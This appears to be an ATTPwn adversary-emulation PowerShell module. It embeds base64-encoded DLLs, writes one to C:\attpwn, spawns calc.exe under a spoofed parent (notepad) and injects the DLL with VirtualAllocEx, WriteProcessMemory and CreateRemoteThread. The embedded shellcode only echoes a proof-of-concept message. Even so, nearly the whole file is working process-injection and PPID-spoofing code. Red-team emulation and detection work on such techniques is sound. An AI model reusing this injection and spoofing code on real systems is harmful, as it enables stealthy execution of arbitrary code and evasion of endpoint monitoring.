






function invoke-ATMattpwn
    {
     
    $good = $false
    $results = $null


    
    $os_type = (Get-WmiObject -Class Win32_ComputerSystem).SystemType -match ‘(x64)’
    $dllfile = ""
    if ($os_type -eq "True") 
      {                
      $base64file = "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
      $dllfile = $base64file
      }
    else 
        {        
        $base32file = "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
        $dllfile = $base32file
        }    
    $FileBytes = [System.Convert]::FromBase64String($dllfile)
     if (($FileBytes[0..1] | % {[Char]$_}) -join '' -cne 'MZ')
        {
        Throw "is not a valid executable."
        }

    $path = $Env:SystemDrive+"\attpwn"         
    if (Test-Path $path) 
      { 
      Remove-Item -LiteralPath $path -Force -Recurse
      }
  
    $app = Start-Process notepad -passthru        
    New-Item $path -ItemType Directory
    $filePath = $Env:SystemDrive+"\attpwn\inject.DLL"   
    $spawnpath = $Env:WinDir+"\System32\calc.exe"
    $FileBytes | Set-Content $filePath -Encoding Byte    
    $execution = PPID-Spoof -ppid $app.Id  -spawnto $spawnpath -dllpath $filePath
    $good = $execution.success    
    $results = $execution.results
    sleep 2
    Stop-Process -Id  $app.Id
   
    return @{results=$results;success=$good}
    }


    function PPID-Spoof{
       
      
        [CmdletBinding()]
        param (
          [Parameter(Mandatory = $True)]
          [int]$ppid, 
          [Parameter(Mandatory = $True)]
          [string]$spawnTo, 
          [Parameter(Mandatory = $True)]
          [string]$dllPath
        )
      
      

      Add-Type -TypeDefinition @"
      using System;
      using System.Runtime.InteropServices;

      [StructLayout(LayoutKind.Sequential)]
      public struct PROCESS_INFORMATION 
      {
          public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
      }

      [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
      public struct STARTUPINFOEX
      {
            public STARTUPINFO StartupInfo; public IntPtr lpAttributeList;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct SECURITY_ATTRIBUTES
      {
          public int nLength; public IntPtr lpSecurityDescriptor; public int bInheritHandle;
      }

      [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
      public struct STARTUPINFO
      {
          public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
      }

      [Flags]
      public enum AllocationType
      {
            Commit = 0x1000,  Reserve = 0x2000,  Decommit = 0x4000,  Release = 0x8000,  Reset = 0x80000,  Physical = 0x400000,  TopDown = 0x100000,  WriteWatch = 0x200000,  LargePages = 0x20000000
      }

      [Flags]
      public enum MemoryProtection
      {
            Execute = 0x10,  ExecuteRead = 0x20,  ExecuteReadWrite = 0x40,  ExecuteWriteCopy = 0x80,  NoAccess = 0x01,  ReadOnly = 0x02,  ReadWrite = 0x04,  WriteCopy = 0x08,  GuardModifierflag = 0x100,  NoCacheModifierflag = 0x200,  WriteCombineModifierflag = 0x400
      }

      public static class Kernel32{
        [DllImport("kernel32.dll",  SetLastError = true)]
        public static extern IntPtr OpenProcess(
          UInt32 processAccess, 
          bool bInheritHandle, 
          int processId);

        [DllImport("kernel32.dll",  SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitializeProcThreadAttributeList(
              IntPtr lpAttributeList, 
              int dwAttributeCount, 
              int dwFlags, 
              ref IntPtr lpSize);

        [DllImport("kernel32.dll",  SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UpdateProcThreadAttribute(
              IntPtr lpAttributeList, 
              uint dwFlags, 
              IntPtr Attribute, 
              IntPtr lpValue, 
              IntPtr cbSize, 
              IntPtr lpPreviousValue, 
              IntPtr lpReturnSize);

        [DllImport("kernel32.dll",  SetLastError = true)]
        public static extern IntPtr GetProcessHeap();

        [DllImport("kernel32.dll",  SetLastError=false)]
        public static extern IntPtr HeapAlloc(IntPtr hHeap,  uint dwFlags,  UIntPtr dwBytes);

        [DllImport("kernel32.dll",  SetLastError=true)]
        public static extern bool CreateProcess(
            string lpApplicationName, 
            string lpCommandLine, 
            ref SECURITY_ATTRIBUTES lpProcessAttributes,  
            ref SECURITY_ATTRIBUTES lpThreadAttributes, 
            bool bInheritHandles,  
            uint dwCreationFlags, 
            IntPtr lpEnvironment, 
            string lpCurrentDirectory, 
            [In] ref STARTUPINFOEX lpStartupInfo,  
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll",  SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32.dll",  SetLastError=true,  ExactSpelling=true)]
        public static extern IntPtr VirtualAllocEx(
          IntPtr hProcess,  
          IntPtr lpAddress, 
          Int32 dwSize,  
          AllocationType flAllocationType,  
          MemoryProtection flProtect);

        [DllImport("kernel32.dll",  SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,  
          IntPtr lpBaseAddress, 
          byte[] lpBuffer,  
          Int32 nSize,  
          out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(
          IntPtr hProcess,  
          IntPtr lpAddress, 
          Int32 dwSize,  
          uint flNewProtect,  
          out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
          IntPtr hProcess, 
          IntPtr lpThreadAttributes,  
          uint dwStackSize,  
          IntPtr lpStartAddress,  
          IntPtr lpParameter,  
          uint dwCreationFlags,  
          IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool ProcessIdToSessionId(uint dwProcessId,  out uint pSessionId);

        [DllImport("kernel32.dll")]
        public static extern uint GetCurrentProcessId();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        [DllImport("kernel32", CharSet=CharSet.Ansi)]
        public static extern IntPtr GetProcAddress(
          IntPtr hModule,
          string procName);

        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(
          string lpModuleName);
      }
"@
      
        

        $good = $false
        $results = ""
        $processSessionId = 0
        $parentSessionId = 0
        $currentPid = [Kernel32]::GetCurrentProcessId()
        $result1 = [Kernel32]::ProcessIdToSessionId($currentPid, [ref]$processSessionId)
        $result2 = [Kernel32]::ProcessIdToSessionId($ppid, [ref]$parentSessionId)
      
        if(!$result1 -or !$result2){
          $results =  "kernel32!ProcessIdToSessionId function failed!"           
          return @{results=$results;success=$good}
        }
        if($processSessionId -ne $parentSessionId){
          $results =  "Different session id for processes! Try process that's within the same session instead."           
          return @{results=$results;success=$good}
          
        }
      
        

        $sInfo = New-Object StartupInfo
        $sInfoEx = New-Object STARTUPINFOEX
        $pInfo = New-Object PROCESS_INFORMATION
        $SecAttr = New-Object SECURITY_ATTRIBUTES
        $SecAttr.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
        $sInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($sInfoEx)
        $lpSize = [IntPtr]::Zero
        $sInfoEx.StartupInfo = $sInfo
        $hSpoofParent = [Kernel32]::OpenProcess(0x1fffff, 0, $ppid)
        $lpValue = [IntPtr]::Zero
        $lpValue = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $hSpoofParent)
        $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
      
        

        $result1 = [Kernel32]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$lpSize)
        $sInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
        $result1 = [Kernel32]::InitializeProcThreadAttributeList($sInfoEx.lpAttributeList, 1, 0, [ref]$lpSize)
        $result1 = [Kernel32]::UpdateProcThreadAttribute($sInfoEx.lpAttributeList, 
                                                          0, 
                                                          0x00020000,  

                                                          $lpValue, 
                                                          [IntPtr]::Size, 
                                                          [IntPtr]::Zero, 
                                                          [IntPtr]::Zero) 
        $result1 = [Kernel32]::CreateProcess($spawnTo, 
                                              [IntPtr]::Zero, 
                                              [ref]$SecAttr, 
                                              [ref]$SecAttr, 
                                              0,
                                              0x08080004, 

                                              

                                              [IntPtr]::Zero, 
                                              $GetCurrentPath, 
                                              [ref] $sInfoEx, 
                                              [ref] $pInfo)
      
        if($result1){          
          $good = $true
          $results =  "Process $spawnTo is spawned with pid "+$pInfo.dwProcessId  
        }else{
          $results = "Failed to spawn process $spawnTo"          
          return @{results=$results;success=$good}
        }
        
        $dllPath = (Resolve-Path $dllPath).ToString()
      
        

        $loadLibAddress = [Kernel32]::GetProcAddress([Kernel32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
        $lpBaseAddress = [Kernel32]::VirtualAllocEx($pInfo.hProcess, 0, $dllPath.Length, 0x00003000, 0x4)
        $result1 = [Kernel32]::WriteProcessMemory($pInfo.hProcess, $lpBaseAddress, (New-Object "System.Text.ASCIIEncoding").GetBytes($dllPath), $dllPath.Length, [ref]0)
        $result1 = [Kernel32]::CreateRemoteThread($pInfo.hProcess, 0, 0, $loadLibAddress, $lpBaseAddress, 0, 0)
      return @{results=$results;success=$good}
      }
      







$execute = {
  
}






$execute = invoke-ATMattpwn



  

  

    
  


return @{results=$execute.results;success=$execute.success}